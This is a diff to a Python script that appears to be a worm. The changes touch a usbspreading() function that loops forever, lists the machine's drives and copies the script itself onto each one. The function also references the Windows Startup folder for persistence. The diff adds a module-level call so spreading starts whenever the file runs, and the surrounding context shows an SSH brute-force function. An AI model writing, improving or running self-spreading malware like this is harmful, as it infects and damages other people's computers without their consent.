@@ -14,7 +14,8 @@ import urllib
 import time
 from ftplib import FTP
 import ftplib
-
+from shutil import copy2
+import win32api
 # ------------------- Logging ----------------------- #
 logger = logging.getLogger(__name__)
 coloredlogs.install(level='DEBUG', logger=logger)
@@ -163,8 +164,7 @@ def bruteforce_ssh(host, wordlist):
         
 def usbspreading():
 
-    user = getpass.getuser()
-    bootfolder = "C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
+    bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
 
     while True:
         drives = win32api.GetLogicalDriveStrings()
@@ -176,4 +176,5 @@ def usbspreading():
             else:
                 copy2(__file__, drive)
         time.sleep(3)
-        
+
+usbspreading()
